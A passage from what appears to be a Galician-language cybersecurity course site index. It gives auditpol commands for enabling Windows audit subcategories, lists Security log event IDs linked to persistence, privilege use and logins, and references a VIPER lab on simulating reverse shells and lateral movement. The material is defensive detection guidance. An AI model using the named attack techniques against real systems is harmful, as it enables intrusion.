<code>schtasks.exe</code> ou payloads.</p> </li> <li> <p>Activar auditor\u00eda de acceso ao rexistro</p> <pre><code>auditpol /set /subcategory:\"Registro\" /success:enable /failure:enable\n</code></pre> <p>Recomendado para detectar manipulaci\u00f3ns persistentes a trav\u00e9s de claves como <code>Run</code>, <code>RunOnce</code>, <code>Winlogon</code>, etc.</p> </li> <li> <p>Activar auditor\u00eda de uso de privilexios</p> <pre><code>auditpol /set /subcategory:\"Uso de privilegio no confidencial\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Uso de privilegio confidencial\" /success:enable /failure:enable\n</code></pre> <p>Isto permite detectar eventos onde se utilizan permisos elevados como <code>SeDebugPrivilege</code> ou <code>SeTcbPrivilege</code>.</p> </li> <li> <p>Activar auditor\u00eda de acceso a ficheiros e obxectos</p> <pre><code>auditpol /set /subcategory:\"Sistema de archivos\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Objeto de kernel\" /success:enable /failure:enable\n</code></pre> <p>Necesario para ver actividades sobre recursos sensibles.</p> </li> <li> <p>Activar seguimento detallado</p> <pre><code>auditpol /set /subcategory:\"Actividad DPAPI\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Eventos de RPC\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Creaci\u00f3n del proceso\" /success:enable /failure:enable\n</code></pre> <p>Isto axuda a detectar procesos encadeados ou movemento lateral baseado en chamadas remotas.</p> </li> </ol> </li> <li> <p>Onde ver os rexistros xerados por auditpol en Windows</p> <p>Cando activas auditor\u00eda avanzada cun comando <code>auditpol</code>, os eventos que se rexistran non aparecen no log de Sysmon, sen\u00f3n nun log nativo do sistema chamado Seguridad.</p> <ul> <li>Ruta no Visor de Eventos</li> </ul> <pre><code>Visor de eventos &gt;\n  Registros de Windows &gt;\n    Seguridad\n</code></pre> <p>Aqu\u00ed \u00e9 onde se gardan os eventos do sistema relacionados con:   - Logins   - Execuci\u00f3ns de procesos   - Cambios en contas   - Uso de privilexios   - Acceso a rexistro e obxectos  </p> <ul> <li> <p>Eventos com\u00fans segundo a subcategor\u00eda auditada</p> Acci\u00f3n auditada Evento ID Significado Creaci\u00f3n de proceso <code>4688</code> Execuci\u00f3n dun proceso (<code>cmd.exe</code>, <code>schtasks.exe</code>) Inicio de sesi\u00f3n exitoso <code>4624</code> Login correcto Fallo de login <code>4625</code> Intento fallido Uso de privilexios <code>4672</code>, <code>4673</code> Uso de <code>SeDebugPrivilege</code>, etc. Cambio de clave de rexistro <code>4657</code> Persistencia ou manipulaci\u00f3n Creaci\u00f3n/activaci\u00f3n de conta <code>4720</code>, <code>4722</code> Alta ou desbloqueo </li> <li> <p>Como buscar</p> <ol> <li>Abre o Visor de Eventos</li> <li>Vai a <code>Seguridad</code></li> <li>Fai clic en \"Filtrar registro actual\"</li> <li>Introduce o ID do evento (ex: <code>4688</code>) ou palabra clave</li> </ol> </li> </ul> </li> </ol> <p>Activar toda a auditor\u00eda dispo\u00f1ible en Windows cun \u00fanico comando</p> <p>Se precisas rexistrar todos os eventos posibles de auditor\u00eda de seguridade en Windows (para fins forenses, detecci\u00f3n de intrusi\u00f3ns ou monitorizaci\u00f3n completa), podes activar todas as subcategor\u00edas de auditor\u00eda ao mesmo tempo usando <code>auditpol</code>:</p> <pre><code>auditpol /set /category:* /success:enable /failure:enable\n</code></pre> <p>Este comando:</p> <ul> <li>Recorre automaticamente todas as categor\u00edas e subcategor\u00edas dispo\u00f1ibles.</li> <li>Activa a auditor\u00eda de:  <ul> <li>Aciertos (success)  </li> <li>Erros (failure)  </li> </ul> </li> <li>Afecta a:  <ul> <li>Creaci\u00f3n de procesos, rexistro, logins, cambios en contas, uso de privilexios, etc.</li> </ul> </li> </ul> <p>Advertencia</p> <ul> <li>Este nivel de auditor\u00eda pode xerar grandes volumes de eventos no log de seguridade (<code>Seguridad</code>).</li> <li>\u00c9 ideal para contornas de laboratorio ou sistemas cr\u00edticos, pero pode ter impacto en rendemento ou disco en produci\u00f3n.</li> </ul> <p>Complementa esta auditor\u00eda con Sysmon para unha visi\u00f3n m\u00e1is detallada de procesos, rede e persistencia.</p>"},{"location":"ud4/viper/#conclusion","title":"Conclusi\u00f3n","text":"<p>Esta gu\u00eda ofrece un procedemento pr\u00e1ctico e detallado para realizar simulaci\u00f3ns de ataques com\u00fans (Reverse Shell, Movemento Lateral, Persistencia) con VIPER e aplicar contramedidas efectivas (bastionado) desde a perspectiva do Blue Team. Simular estes ataques axuda \u00e1s organizaci\u00f3ns a comprender as s\u00faas debilidades e a mellorar a s\u00faa postura de seguridade. Seguir estas recomendaci\u00f3ns mellorar\u00e1 significativamente a resiliencia da infraestrutura fronte a ataques reais.</p>"},{"location":"ud4/wazuh/","title":"Pr\u00e1cticas Monitorizaci\u00f3n","text":"<p>De interese</p> <ul> <li>repoEDU-CCbySA - BRS - Monitorizaci\u00f3n <pre><code>$ tree Monitorizacion/Xestion-de-Seguridade\nMonitorizacion/Xestion-de-Seguridade/\n.\n\u251c\u2500\u2500 1-Taller-BRS-Practica-Wazuh_pageNumbers.pdf\n</code></pre></li> </ul> <p>Hash</p> <ul> <li>Taller BRS Pr\u00e1ctica Wazuh</li> </ul>"}]}